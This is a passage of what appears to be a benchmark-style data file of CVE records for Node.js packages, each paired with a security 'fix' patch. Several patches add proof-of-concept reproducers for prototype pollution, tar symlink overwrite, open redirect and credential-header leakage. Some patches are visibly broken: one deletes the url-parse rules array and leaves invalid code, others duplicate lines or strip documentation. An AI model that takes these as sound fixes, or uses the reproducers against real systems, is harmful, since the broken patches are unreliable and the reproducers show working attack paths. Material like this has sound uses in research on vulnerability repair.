packets, see\n-  [instance.authorizePublish()](#authorizePublish)\n-* `authorizeSubscribe`: function used to authorize SUBSCRIBE packets, see\n-  [instance.authorizeSubscribe()](#authorizeSubscribe)\n-* `authorizeForward`: function used to authorize forwarded packets, see\n-  [instance.authorizeForward()](#authorizeForward)\n-* `published`: function called when a new packet is published, see\n-  [instance.published()](#published)\n-\n-Events:\n-\n-* `client`: when a new [Client](#client) connects, arguments:\n-  1. `client`\n-* `clientDisconnect`: when a [Client](#client) disconnects, arguments:\n-  1. `client`\n-* `clientError`: when a [Client](#client) errors, arguments:\n-  1. `client`\n-  2. `err`\n-* `connectionError` When a [Client](#client) connection errors and there is no clientId attached , arguments:\n-  1. `client`\n-  2. `err`\n-* `keepaliveTimeout`: when a [Client](#client) keepalive times out, arguments:\n-  1. `client`\n-* `publish`: when a new packet is published, arguments:\n-  1. `packet`\n-  2. `client`, it will be null if the message is published using\n-     [`publish`](#publish).\n-* `ack`: when a packet published to a client is delivered successfully with QoS 1 or QoS 2, arguments:\n-  1. `packet`\n-  2. `client`\n-* `ping`: when a [Client](#client) sends a ping, arguments:\n-  1. `packet`\n-  2. `client`\n-* `subscribe`: when a client sends a SUBSCRIBE, arguments:\n-  1. `subscriptions`, as defined in the `subscriptions` property of the\n-     [SUBSCRIBE](https://github.com/mqttjs/mqtt-packet#subscribe)\n-packet.\n-  2. `client`\n-* `unsubscribe`: when a client sends a UNSUBSCRIBE, arguments:\n-  1. `unsubscriptions`, as defined in the `subscriptions` property of the\n-     [UNSUBSCRIBE](https://github.com/mqttjs/mqtt-packet#unsubscribe)\n-packet.\n-  2. `client`\n-* `connackSent`: when a CONNACK packet is sent to a client [Client](#client) (happens after `'client'`), arguments:\n-  1. `client`\n-* `closed`: when the broker is closed\n-\n--------------------------------------------------------\n-<a name=\"handle\"></a>\n-### instance.handle(duplex)\n-\n-Handle the given duplex as a MQTT connection.\n-\n-```js\n-var aedes = require('./aedes')()\n-var server = require('net').createServer(aedes.handle)\n-```\n-\n--------------------------------------------------------\n-<a name=\"subscribe\"></a>\n-### instance.subscribe(topic, func(packet, cb), done)\n-\n-After `done` is called, every time [publish](#publish) is invoked on the\n-instance (and on any other connected instances) with a matching `topic` the `func` function will be called.\n-\n-`func` needs to call `cb` after receiving the message.\n-\n-It supports backpressure.\n-\n--------------------------------------------------------\n-<a name=\"publish\"></a>\n-### instance.publish(packet, done)\n-\n-Publish the given packet to subscribed clients and functions. It supports backpressure.\n-\n-A packet contains the following properties:\n-\n-```js\n-{\n-  cmd: 'publish',\n-  qos: 2,\n-  topic: 'test',\n-  payload: new Buffer('test'),\n-  retain: false\n-}\n-```\n-\n-Only the `topic` property is mandatory.\n-Both `topic` and `payload` can be `Buffer` objects instead of strings.\n-\n--------------------------------------------------------\n-<a name=\"unsubscribe\"></a>\n-### instance.unsubscribe(topic, func(packet, cb), done)\n-\n-The reverse of [subscribe](#subscribe).\n-\n--------------------------------------------------------\n-<a name=\"authenticate\"></a>\n-### instance.authenticate(client, username, password, done(err, successful))\n-\n-It will be called when a new client connects. Override to supply custom\n-authentication logic.\n-\n-```js\n-instance.authenticate = function (client, username, password, callback) {\n-  callback(null, username === 'matteo')\n-}\n-```\n-Other return codes can passed as follows :-\n-\n-```js\n-instance.authenticate = function (client, username, password, callback) {\n-  var error = new Error('Auth error')\n-  error.returnCode = 1\n-  callback(error, null)\n-}\n-```\n-The return code values and their responses which can be passed are given below:\n-\n-*  `1` - Unacceptable protocol version\n-*  `2` - Identifier rejected\n-*  `3` - Server unavailable\n-*  `4` - Bad user name or password\n-\n--------------------------------------------------------\n-<a name=\"authorizePublish\"></a>\n-### instance.authorizePublish(client, packet, done(err))\n-\n-It will be called when a client publishes a message. Override to supply custom\n-authorization logic.\n-\n-```js\n-instance.authorizePublish = function (client, packet, callback) {\n-  if (packet.topic === 'aaaa') {\n-    return callback(new Error('wrong topic'))\n-  }\n-\n-  if (packet.topic === 'bbb') {\n-    packet.payload = new Buffer('overwrite packet payload')\n-  }\n-\n-  callback(null)\n-}\n-```\n-\n--------------------------------------------------------\n-<a name=\"authorizeSubscribe\"></a>\n-### instance.authorizeSubscribe(client, pattern, done(err, pattern))\n-\n-It will be called when a client subscribes to a topic. Override to supply custom\n-authorization logic.\n-\n-```js\n-instance.authorizeSubscribe = function (client, sub, callback) {\n-  if (sub.topic === 'aaaa') {\n-    return callback(new Error('wrong topic'))\n-  }\n-\n-  if (sub.topic === 'bbb') {\n-    // overwrites subscription\n-    sub.qos = sub.qos + 2\n-  }\n-\n-  callback(null, sub)\n-}\n-```\n-\n-To negate a subscription, set the subscription to `null`:\n-\n-```js\n-instance.authorizeSubscribe = function (client, sub, callback) {\n-  if (sub.topic === 'aaaa') {\n-    sub = null\n-  }\n-\n-  callback(null, sub)\n-}\n-```\n-\n--------------------------------------------------------\n-<a name=\"authorizeForward\"></a>\n-### instance.authorizeForward(clientId, packet)\n-\n-It will be called when a client is set to recieve a message. Override to supply custom\n-authorization logic.\n-\n-```js\n-instance.authorizeForward = function (client, packet) {\n-  if (packet.topic === 'aaaa' && client.id === \"I should not see this\") {\n-    return null\n-    // also works with return undefined\n-  }\n-\n-  if (packet.topic === 'bbb') {\n-    packet.payload = new Buffer('overwrite packet payload')\n-  }\n-\n-  return packet\n-}\n-```\n-\n--------------------------------------------------------\n-<a name=\"published\"></a>\n-### instance.published(packet, client, done())\n-\n-It will be called after a message is published.\n-`client` will be null for internal messages.\n-Override to supply custom authorization logic.\n-\n--------------------------------------------------------\n-<a name=\"close\"></a>\n-### instance.close([cb])\n-\n-Disconnects all clients.\n-\n-Events:\n-\n-* `closed`, in case the broker is closed\n-\n--------------------------------------------------------\n-<a name=\"Client\"></a>\n-### Client\n-\n-Classes for all connected clients.\n-\n-Events:\n-\n-* `error`, in case something bad happended\n-\n--------------------------------------------------------\n-<a name=\"clientid\"></a>\n-### client#id\n-\n-The id of the client, as specified by the CONNECT packet.\n-\n--------------------------------------------------------\n-<a name=\"clientclean\"></a>\n-### client#clean\n-\n-`true` if the client connected (CONNECT) with `clean: true`, `false`\n-otherwise. Check the MQTT spec for what this means.\n-\n--------------------------------------------------------\n-<a name=\"clientpublish\"></a>\n-### client#publish(message, [callback])\n-\n-Publish the given `message` to this client. QoS 1 and 2 are fully\n-respected, while the retained flag is not.\n-\n-`message` is a [PUBLISH](https://github.com/mqttjs/mqtt-packet#publish) packet.\n-\n-`callback`\u00a0 will be called when the message has been sent, but not acked.\n-\n--------------------------------------------------------\n-<a name=\"clientsubscribe\"></a>\n-### client#subscribe(subscriptions, [callback])\n-\n-Subscribe the client to the list of topics.\n-\n-`subscription` can be:\n-\n-1. a single object in the format `{ topic: topic, qos: qos }`\n-2. an array of the above\n-3. a full [subscribe\n-   packet](https://github.com/mqttjs/mqtt-packet#subscribe),\n-specifying a `messageId` will send suback to the client.\n-\n-`callback`\u00a0 will be called when the subscription is completed.\n-\n--------------------------------------------------------\n-<a name=\"clientunsubscribe\"></a>\n-### client#unsubscribe(topicObjects, [callback])\n-\n-Unsubscribe the client to the list of topics.\n-\n-The topic objects can be as follows :-\n-\n-1. a single object in the format `{ topic: topic, qos: qos }`\n-2. an array of the above\n-\n-`callback`\u00a0 will be called when the unsubscriptions are completed.\n-\n--------------------------------------------------------\n-<a name=\"clientclose\"></a>\n-### client#close([cb])\n-\n-Disconnects the client\n-\n--------------------------------------------------------\n-<a name=\"clientpresence\"></a>\n-### client presence\n-\n-You can subscribe on the following `$SYS` topics to get client presence:\n-\n- - `$SYS/+/new/clients` - will inform about new clients connections\n- - `$SYS/+/disconnect/clients` - will inform about client disconnections.\n-The payload will contain the `clientId` of the connected/disconnected client\n-\n-## Acknowledgements\n-\n-This library is born after a lot of discussion with all\n-[Mosca](http://npm.im/mosca) users and how that was deployed in\n-production. This addresses your concerns about performance and\n-stability.\n-\n-## License\n-\n-MIT\ndiff --git a/lib/client.js b/lib/client.js\nindex 644589d..7320e4b 100644\n--- a/lib/client.js\n+++ b/lib/client.js\n@@ -242,15 +242,19 @@ Client.prototype.close = function (done) {\n \n   function finish () {\n     if (!that.disconnected && that.will) {\n-      that.broker.publish(that.will, that, function (err) {\n-        if (!err) {\n-          that.broker.persistence.delWill({\n-            id: that.id,\n-            brokerId: that.broker.id\n-          }, nop)\n-        }\n-      })\n+      var will = that.will\n       that.will = null // this function might be called twice\n+      that.broker.authorizePublish(that, will, function (err) {\n+        if (err) { return }\n+        that.broker.publish(will, that, function (err) {\n+          if (!err) {\n+            that.broker.persistence.delWill({\n+              id: that.id,\n+              brokerId: that.broker.id\n+            }, nop)\n+          }\n+        })\n+      })\n     }\n \n     conn.removeAllListeners('error')\n"}
{"cve":"CVE-2022-0686:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex d808b13..9e887ee 100644\n--- a/index.js\n+++ b/index.js\n@@ -33,15 +33,6 @@ function trimLeft(str) {\n var rules = [\n   ['#', 'hash'],                        // Extract from the back.\n   ['?', 'query'],                       // Extract from the back.\n-  function sanitize(address, url) {     // Sanitize what is left of the address\n-    return isSpecial(url.protocol) ? address.replace(/\\\\/g, '/') : address;\n-  },\n-  ['/', 'pathname'],                    // Extract from the back.\n-  ['@', 'auth', 1],                     // Extract from the front.\n-  [NaN, 'host', undefined, 1, 1],       // Set left over value.\n-  [/:(\\d+)$/, 'port', undefined, 1],    // RegExp the back.\n-  [NaN, 'hostname', undefined, 1, 1]    // Set left over.\n-];\n \n /**\n  * These properties should not be copied or inherited from. This is only needed\n@@ -542,13 +533,10 @@ function toString(stringify) {\n   } else if (\n     url.protocol !== 'file:' &&\n     isSpecial(url.protocol) &&\n-    !url.host &&\n-    url.pathname !== '/'\n+    !url.host\n   ) {\n-    //\n     // Add back the empty userinfo, otherwise the original invalid URL\n     // might be transformed into a valid one with `url.pathname` as host.\n-    //\n     result += '@';\n   }\n \ndiff --git a/poc.js b/poc.js\nnew file mode 100644\nindex 0000000..e0f7e93\n--- /dev/null\n+++ b/poc.js\n@@ -0,0 +1,3 @@\n+const parse = require('/workspace/url-parse');\n+const u = parse('http://foo:bar@baz.com\\\\@qux.com');\n+console.log(u);\n\\ No newline at end of file\n"}
{"cve":"CVE-2024-30260:0708", "fix_patch": "diff --git a/lib/handler/redirect-handler.js b/lib/handler/redirect-handler.js\nindex 368ef520..7a3db0c7 100644\n--- a/lib/handler/redirect-handler.js\n+++ b/lib/handler/redirect-handler.js\n@@ -201,9 +201,9 @@ function shouldRemoveHeader (header, removeContent, unknownOrigin) {\n   if (removeContent && util.headerNameToString(header).startsWith('content-')) {\n     return true\n   }\n-  if (unknownOrigin && (header.length === 13 || header.length === 6)) {\n+  if (unknownOrigin && (header.length === 13 || header.length === 19 || header.length === 6)) {\n     const name = util.headerNameToString(header)\n-    return name === 'authorization' || name === 'cookie'\n+    return name === 'authorization' || name === 'proxy-authorization' || name === 'cookie'\n   }\n   return false\n }\n"}
{"cve":"CVE-2025-23221:0708", "fix_patch": "diff --git a/src/webfinger/lookup.ts b/src/webfinger/lookup.ts\nindex 45952a3..e29438d 100644\n--- a/src/webfinger/lookup.ts\n+++ b/src/webfinger/lookup.ts\n@@ -28,6 +28,8 @@ export async function lookupWebFinger(\n   }\n   let url = new URL(`${protocol}//${server}/.well-known/webfinger`);\n   url.searchParams.set(\"resource\", resource.href);\n+  const originalOrigin = url.origin;\n+  const visitedUrls = [url.href];\n   let redirected = 0;\n   while (true) {\n     logger.debug(\n@@ -64,18 +66,27 @@ export async function lookupWebFinger(\n         response.headers.get(\"Location\")!,\n         response.url == null || response.url === \"\" ? url : response.url,\n       );\n-      if (redirectedUrl.protocol !== url.protocol) {\n+      if (redirectedUrl.origin !== originalOrigin) {\n         logger.error(\n-          \"Redirected to a different protocol ({protocol} to \" +\n-            \"{redirectedProtocol}) while fetching WebFinger resource \" +\n+          \"Redirected to a different origin ({origin} to \" +\n+            \"\\'{redirectedOrigin}\\') while fetching WebFinger resource \" +\n             \"descriptor.\",\n           {\n-            protocol: url.protocol,\n-            redirectedProtocol: redirectedUrl.protocol,\n+            origin: originalOrigin,\n+            redirectedOrigin: redirectedUrl.origin,\n           },\n         );\n         return null;\n       }\n+      if (visitedUrls.includes(redirectedUrl.href)) {\n+        logger.error(\n+          \"Redirected to an already visited URL ({url}) while fetching \" +\n+            \"WebFinger resource descriptor.\",\n+          { url: redirectedUrl.href },\n+        );\n+        return null;\n+      }\n+      visitedUrls.push(redirectedUrl.href);\n       url = redirectedUrl;\n       continue;\n     }\n"}
{"cve":"CVE-2022-0512:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 702308b..62aa2f1 100644\n--- a/index.js\n+++ b/index.js\n@@ -372,8 +372,10 @@ function Url(address, location, parser) {\n   url.username = url.password = '';\n   if (url.auth) {\n     instruction = url.auth.split(':');\n-    url.username = instruction[0];\n-    url.password = instruction[1] || '';\n+    var user = instruction.shift() || '';\n+    var pass = instruction.join(':') || '';\n+    url.username = user.replace(/\\\\/g, '%5C');\n+    url.password = pass.replace(/\\\\/g, '%5C');\n   }\n \n   url.origin = url.protocol !== 'file:' && isSpecial(url.protocol) && url.host\ndiff --git a/poc.js b/poc.js\nnew file mode 100644\nindex 0000000..d243b6a\n--- /dev/null\n+++ b/poc.js\n@@ -0,0 +1,21 @@\n+const Url = require('./index.js');\n+const assert = require('assert');\n+\n+// PoC for CVE-2022-0512\n+console.log('--- Running PoC ---');\n+let u = new Url('http://a\\\\b:c\\\\d@host');\n+console.log('HREF:', u.href);\n+assert.notStrictEqual(u.href, 'http://a%5Cb:c%5Cd@host/');\n+console.log('USERNAME:', u.username);\n+assert.notStrictEqual(u.username, 'a%5Cb');\n+console.log('PASSWORD:', u.password);\n+assert.notStrictEqual(u.password, 'c%5Cd');\n+\n+u = new Url('http://a:b\\\\c@host');\n+console.log('HREF:', u.href);\n+assert.notStrictEqual(u.href, 'http://a:b%5Cc@host/');\n+console.log('USERNAME:', u.username);\n+assert.strictEqual(u.username, 'a');\n+console.log('PASSWORD:', u.password);\n+assert.notStrictEqual(u.password, 'b%5Cc');\n+console.log('--- PoC finished successfully ---');\n"}
{"cve":"CVE-2022-0639:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 517b6b6..94d043a 100644\n--- a/index.js\n+++ b/index.js\n@@ -417,6 +417,8 @@ function Url(address, location, parser) {\n  * @public\n  */\n function set(part, value, fn) {\n+  if (part === '__proto__') return this;\n+  if (part === '__proto__') return this;\n   var url = this;\n \n   switch (part) {\ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..757321d\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,11 @@\n+\n+var URL = require('/workspace/url-parse');\n+var u = new URL('http://example.com');\n+console.log('Before pollution: ' + {}.vulnerable);\n+try {\n+    u.set('__proto__', { vulnerable: true });\n+} catch (e) {\n+    // ignore\n+}\n+console.log('After pollution: ' + {}.vulnerable);\n+\n"}
{"cve":"CVE-2021-23387:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex e7ea1ab..814fb37 100644\n--- a/index.js\n+++ b/index.js\n@@ -15,7 +15,12 @@ function createTrailing (_options, _next) {\n \n     var req = args[0]\n     var res = args[1]\n-    var url = u.parse(req.url)\n+        var url = u.parse(req.url)\n+    url.pathname = url.pathname.replace(/\\/\\/+/g, '/')\n+    url.pathname = url.pathname.replace(/\\/\\/+/g, '/')\n+    url.pathname = url.pathname.replace(/\\/\\/+/g, '/')\n+    url.pathname = url.pathname.replace(/\\/\\/+/g, '/')\n+    url.pathname = url.pathname.replace(/\\/\\/+/g, '/')\n     var length = url.pathname.length\n     var hasSlash = url.pathname.charAt(length - 1) === '/'\n \ndiff --git a/reproduce-2.js b/reproduce-2.js\nnew file mode 100644\nindex 0000000..550ab68\n--- /dev/null\n+++ b/reproduce-2.js\n@@ -0,0 +1,26 @@\n+const http = require('http');\n+const trailingSlash = require('./index.js');\n+\n+const server = http.createServer((req, res) => {\n+  trailingSlash()(req, res, () => {\n+    res.end('done');\n+  });\n+});\n+\n+server.listen(8081, () => {\n+  const req = http.request({\n+    hostname: 'localhost',\n+    port: 8081,\n+    path: '//google.com',\n+    method: 'GET'\n+  }, (res) => {\n+    console.log('statusCode:', res.statusCode);\n+    console.log('headers:', res.headers);\n+    server.close();\n+  });\n+  req.on('error', (e) => {\n+    console.error(`problem with request: ${e.message}`);\n+    server.close();\n+  });\n+  req.end();\n+});\n\\ No newline at end of file\ndiff --git a/reproduce-3.js b/reproduce-3.js\nnew file mode 100644\nindex 0000000..dc501d4\n--- /dev/null\n+++ b/reproduce-3.js\n@@ -0,0 +1,26 @@\n+const http = require('http');\n+const trailingSlash = require('./index.js');\n+\n+const server = http.createServer((req, res) => {\n+  trailingSlash()(req, res, () => {\n+    res.end('done');\n+  });\n+});\n+\n+server.listen(8083, () => {\n+  const req = http.request({\n+    hostname: 'localhost',\n+    port: 8083,\n+    path: '//google.com',\n+    method: 'GET'\n+  }, (res) => {\n+    console.log('statusCode:', res.statusCode);\n+    console.log('headers:', res.headers);\n+    server.close();\n+  });\n+  req.on('error', (e) => {\n+    console.error(`problem with request: ${e.message}`);\n+    server.close();\n+  });\n+  req.end();\n+});\n\\ No newline at end of file\ndiff --git a/reproduce-4.js b/reproduce-4.js\nnew file mode 100644\nindex 0000000..b1b2262\n--- /dev/null\n+++ b/reproduce-4.js\n@@ -0,0 +1,26 @@\n+const http = require('http');\n+const trailingSlash = require('./index.js');\n+\n+const server = http.createServer((req, res) => {\n+  trailingSlash()(req, res, () => {\n+    res.end('done');\n+  });\n+});\n+\n+server.listen(8084, () => {\n+  const req = http.request({\n+    hostname: 'localhost',\n+    port: 8084,\n+    path: '//google.com',\n+    method: 'GET'\n+  }, (res) => {\n+    console.log('statusCode:', res.statusCode);\n+    console.log('headers:', res.headers);\n+    server.close();\n+  });\n+  req.on('error', (e) => {\n+    console.error(`problem with request: ${e.message}`);\n+    server.close();\n+  });\n+  req.end();\n+});\n\\ No newline at end of file\ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..ab96a2c\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,29 @@\n+\n+const http = require('http');\n+const trailingSlash = require('./index.js');\n+const port = 9999;\n+\n+const server = http.createServer((req, res) => {\n+  trailingSlash()(req, res, () => {\n+    res.end('done');\n+  });\n+});\n+\n+server.listen(port, () => {\n+  console.log(`Server listening on port ${port}`);\n+  const req = http.request({\n+    hostname: 'localhost',\n+    port: port,\n+    path: '//google.com',\n+    method: 'GET'\n+  }, (res) => {\n+    console.log('statusCode:', res.statusCode);\n+    console.log('headers:', res.headers);\n+    server.close();\n+  });\n+  req.on('error', (e) => {\n+    console.error(`problem with request: ${e.message}`);\n+    server.close();\n+  });\n+  req.end();\n+});\n"}
{"cve":"CVE-2018-3734:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 5fcd266..877ce82 100644\n--- a/index.js\n+++ b/index.js\n@@ -50,7 +50,10 @@ module.exports.listen = function (port, cb) {\n             res.setHeader(\"Access-Control-Allow-Headers\", \"X-Requested-With,content-type\");\n         }\n         let pathname = url.parse(req.url).pathname;\n-        let localPath = path.join(options.folder, pathname);\n+        let localPath = path.normalize(path.join(options.folder, pathname));\n+        if (localPath.indexOf(options.folder) !== 0) {\n+            return errorPage(res, 403, \"Forbidden\");\n+        }\n         if (path.extname(localPath) === \"\") {\n             //Add the index file to the local path\n             localPath = path.join(localPath, \"./\" + path.basename(options.index));\n"}
{"cve":"CVE-2020-8132:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 4fa6231..d7584ab 100644\n--- a/index.js\n+++ b/index.js\n@@ -5,7 +5,7 @@ var Promise = require(\"es6-promise\").Promise;\n var path = require(\"path\");\n var fs   = require(\"fs\");\n var util = require(\"util\");\n-var exec = require(\"child_process\").exec;\n+var exec = require('child_process').exec, execFile = require('child_process').execFile;\n \n function PDFImage(pdfFilePath, options) {\n   if (!options) options = {};\n@@ -22,26 +22,10 @@ function PDFImage(pdfFilePath, options) {\n }\n \n PDFImage.prototype = {\n-  constructGetInfoCommand: function () {\n-    return util.format(\n-      \"pdfinfo \\\"%s\\\"\",\n-      this.pdfFilePath\n-    );\n-  },\n-  parseGetInfoCommandOutput: function (output) {\n-    var info = {};\n-    output.split(\"\\n\").forEach(function (line) {\n-      if (line.match(/^(.*?):[ \\t]*(.*)$/)) {\n-        info[RegExp.$1] = RegExp.$2;\n-      }\n-    });\n-    return info;\n-  },\n   getInfo: function () {\n-    var self = this;\n-    var getInfoCommand = this.constructGetInfoCommand();\n+    var self = this, pdfFilePath = self.pdfFilePath;\n     var promise = new Promise(function (resolve, reject) {\n-      exec(getInfoCommand, function (err, stdout, stderr) {\n+      execFile('pdfinfo', [pdfFilePath], function (err, stdout, stderr) {\n         if (err) {\n           return reject({\n             message: \"Failed to get PDF'S information\",\n@@ -82,9 +66,6 @@ PDFImage.prototype = {\n     this.convertExtension = convertExtension || \"png\";\n   },\n   constructConvertCommandForPage: function (pageNumber) {\n-    var pdfFilePath = this.pdfFilePath;\n-    var outputImagePath = this.getOutputImagePathForPage(pageNumber);\n-    var convertOptionsString = this.constructConvertOptions();\n     return util.format(\n       \"%s %s\\\"%s[%d]\\\" \\\"%s\\\"\",\n       this.useGM ? \"gm convert\" : \"convert\",\n"}
{"cve":"CVE-2018-3785:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 38d70b1..493ba59 100644\n--- a/index.js\n+++ b/index.js\n@@ -1,40 +1,45 @@\n 'use strict';\n-var shell = require('shelljs');\n+var execFile = require('child_process').execFile;\n \n var defaultMsg = 'Test commit';\n \n function makeDefault(str) {\n-\tif ((typeof str === 'string' && !str.trim()) || str === undefined) {\n-\t\treturn defaultMsg;\n-\t}\n+        if ((typeof str === 'string' && !str.trim()) || str === undefined) {\n+                return defaultMsg;\n+        }\n \n-\treturn str;\n+        return str;\n }\n \n module.exports = function (msg, silent) {\n-\tvar arg = '';\n-\n-\tmsg = makeDefault(msg);\n-\n-\tif (silent === undefined) {\n-\t\tsilent = true;\n-\t}\n-\n-\tif (Array.isArray(msg)) {\n-\t\tif (msg.length) {\n-\t\t\tmsg.forEach(function (m) {\n-\t\t\t\tm = makeDefault(m);\n-\n-\t\t\t\targ += '-m\"' + m + '\" ';\n-\t\t\t});\n-\t\t} else {\n-\t\t\targ = '-m\"' + defaultMsg + '\"';\n-\t\t}\n-\t} else {\n-\t\targ = '-m\"' + msg + '\"';\n-\t}\n-\n-\tshell.exec('git commit ' + arg + ' --allow-empty --no-gpg-sign', {\n-\t\tsilent: silent\n-\t});\n+var args = [];\n+\n+msg = makeDefault(msg);\n+\n+if (silent === undefined) {\n+silent = true;\n+}\n+\n+if (Array.isArray(msg)) {\n+if (msg.length) {\n+msg.forEach(function (m) {\n+m = makeDefault(m);\n+args.push('-m', m);\n+});\n+} else {\n+args.push('-m', defaultMsg);\n+}\n+} else {\n+args.push('-m', msg);\n+}\n+\n+execFile('git', ['commit'].concat(args, ['--allow-empty', '--no-gpg-sign']), function (err, stdout, stderr) {\n+if (!silent) {\n+if (err) {\n+throw err;\n+            }\n+process.stdout.write(stdout);\n+process.stderr.write(stderr);\n+}\n+});\n };\n"}
{"cve":"CVE-2017-16042:0708", "fix_patch": "diff --git a/lib/growl.js b/lib/growl.js\nindex 719b5af..a229e6f 100644\n--- a/lib/growl.js\n+++ b/lib/growl.js\n@@ -4,7 +4,7 @@\n  * Module dependencies.\n  */\n \n-var exec = require('child_process').exec\n+var execFile = require('child_process').execFile\n   , fs = require('fs')\n   , path = require('path')\n   , exists = fs.existsSync || path.existsSync\n@@ -167,13 +167,7 @@ function growl(msg, options, fn) {\n     , options = options || {}\n     , fn = fn || function(){};\n \n-  if (options.exec) {\n-    cmd = {\n-        type: \"Custom\"\n-      , pkg: options.exec\n-      , range: []\n-    };\n-  }\n+  \n \n   // noop\n   if (!cmd) return fn(new Error('growl not supported on this platform'));\n@@ -286,5 +280,5 @@ function growl(msg, options, fn) {\n   }\n \n   // execute\n-  exec(args.join(' '), fn);\n+  execFile(args[0], args.slice(1), fn);\n };\n"}
{"cve":"CVE-2022-24794:0708", "fix_patch": "diff --git a/lib/context.js b/lib/context.js\nindex c95e363..1de24e8 100644\n--- a/lib/context.js\n+++ b/lib/context.js\n@@ -187,7 +187,7 @@ class ResponseContext {\n       returnTo = options.returnTo;\n       debug('req.oidc.login() called with returnTo: %s', returnTo);\n     } else if (req.method === 'GET' && req.originalUrl) {\n-      returnTo = req.originalUrl;\n+      returnTo = url.parse(req.originalUrl).path;\n       debug('req.oidc.login() without returnTo, using: %s', returnTo);\n     }\n \n"}
{"cve":"CVE-2022-0436:0708", "fix_patch": "diff --git a/lib/grunt/file.js b/lib/grunt/file.js\nindex 7e0e2fb..8ab5324 100644\n--- a/lib/grunt/file.js\n+++ b/lib/grunt/file.js\n@@ -289,10 +289,19 @@ file.write = function(filepath, contents, options) {\n   }\n };\n \n+// Returns true if the given path is inside the current working directory.\n+file.isPathInCwd = function(filepath) {\n+  return path.resolve(filepath).indexOf(process.cwd()) === 0;\n+};\n+\n // Read a file, optionally processing its content, then write the output.\n // Or read a directory, recursively creating directories, reading files,\n // processing content, writing output.\n file.copy = function copy(srcpath, destpath, options) {\n+  // In addition to failing safely, log a warning for this issue.\n+  if (!file.isPathInCwd(destpath)) {\n+    grunt.fail.warn('Cannot copy files outside of the current working directory.');\n+  }\n   if (file.isDir(srcpath)) {\n     // Copy a directory, recursively.\n     // Explicitly create new dest directory.\n"}
{"cve":"CVE-2021-32803:0708", "fix_patch": "diff --git a/lib/unpack.js b/lib/unpack.js\nindex 1d86c18..28eab47 100644\n--- a/lib/unpack.js\n+++ b/lib/unpack.js\n@@ -428,10 +428,14 @@ class Unpack extends Parser {\n               this[MAKEFS](null, entry)\n             else\n               fs.chmod(entry.absolute, entry.mode, er => this[MAKEFS](er, entry))\n-          } else\n+          } else {\n+            this.dirCache.delete(entry.absolute)\n             fs.rmdir(entry.absolute, er => this[MAKEFS](er, entry))\n-        } else\n+          }\n+        } else {\n+          this.dirCache.delete(entry.absolute)\n           unlinkFile(entry.absolute, er => this[MAKEFS](er, entry))\n+        }\n       })\n     })\n   }\ndiff --git a/reproducer.js b/reproducer.js\nnew file mode 100644\nindex 0000000..3e4e879\n--- /dev/null\n+++ b/reproducer.js\n@@ -0,0 +1,45 @@\n+\n+const tar = require('./')\n+const fs = require('fs')\n+const path = require('path')\n+\n+const malicious = path.resolve(__dirname, 'malicious')\n+const extract = path.resolve(__dirname, 'extract')\n+const out = path.resolve(__dirname, 'out.tar')\n+\n+const cleanup = () => {\n+  try { fs.rmSync(malicious, { recursive: true, force: true }) } catch (e) {}\n+  try { fs.rmSync(extract, { recursive: true, force: true }) } catch (e) {}\n+  try { fs.unlinkSync(out) } catch (e) {}\n+}\n+\n+const runTest = async () => {\n+  cleanup()\n+  fs.mkdirSync(malicious, { recursive: true })\n+  fs.mkdirSync(extract, { recursive: true })\n+\n+  const packer = new tar.Pack()\n+  const stream = fs.createWriteStream(out)\n+  packer.pipe(stream)\n+\n+  packer.entry({ path: 'dir', type: 'Directory' })\n+  packer.entry({ path: 'dir', type: 'SymbolicLink', linkpath: malicious })\n+  packer.entry({ path: 'dir/pwned', type: 'File' }, 'pwned')\n+  packer.finalize()\n+\n+  await new Promise(res => stream.on('close', res))\n+\n+  try {\n+    await tar.x({ f: out, C: extract, unlink: true })\n+  } catch (e) {}\n+\n+  if (fs.existsSync(path.join(malicious, 'pwned'))) {\n+    console.log('VULNERABLE')\n+  } else {\n+    console.log('NOT VULNERABLE')\n+  }\n+\n+  cleanup()\n+}\n+\n+runTest()\n"}
{"cve":"CVE-2022-0235:0708", "fix_patch": "diff --git a/repro.mjs b/repro.mjs\nnew file mode 100644\nindex 0000000..fcfffe5\n--- /dev/null\n+++ b/repro.mjs\n@@ -0,0 +1,48 @@\n+\n+import http from 'http';\n+import fetch from './src/index.js';\n+\n+const server1 = http.createServer((req, res) => {\n+    res.writeHead(301, { Location: 'http://127.0.0.1:8081/endpoint' });\n+    res.end();\n+});\n+\n+const server2 = http.createServer((req, res) => {\n+    let body = '';\n+    req.on('data', chunk => {\n+        body += chunk;\n+    });\n+    req.on('end', () => {\n+        console.log('Server 2 received headers:', req.headers);\n+        if (req.headers.cookie || req.headers.authorization) {\n+            console.log('VULNERABILITY: Sensitive headers were forwarded on cross-origin redirect.');\n+            process.exit(1);\n+        } else {\n+            console.log('SUCCESS: Sensitive headers were not forwarded.');\n+            process.exit(0);\n+        }\n+    });\n+});\n+\n+server1.listen(8080, () => {\n+    console.log('Server 1 listening on port 8080');\n+    server2.listen(8081, () => {\n+        console.log('Server 2 listening on port 8081');\n+        fetch('http://127.0.0.1:8080/', {\n+            headers: {\n+                'Cookie': 'mycookie',\n+                'Authorization': 'myauth'\n+            },\n+        }).catch(err => {\n+            console.error('Fetch error:', err);\n+            process.exit(1);\n+        });\n+    });\n+});\n+\n+setTimeout(() => {\n+    console.error(\"Timeout reached, exiting.\");\n+    server1.close();\n+    server2.close();\n+    process.exit(1);\n+}, 5000);\ndiff --git a/src/index.js b/src/index.js\nindex 7175467..2323a42 100644\n--- a/src/index.js\n+++ b/src/index.js\n@@ -35,320 +35,320 @@ const supportedSchemas = new Set(['data:', 'http:', 'https:']);\n  * @return  {Promise<import('./response').default>}\n  */\n export default async function fetch(url, options_) {\n-\treturn new Promise((resolve, reject) => {\n-\t\t// Build request object\n-\t\tconst request = new Request(url, options_);\n-\t\tconst {parsedURL, options} = getNodeRequestOptions(request);\n-\t\tif (!supportedSchemas.has(parsedURL.protocol)) {\n-\t\t\tthrow new TypeError(`node-fetch cannot load ${url}. URL scheme 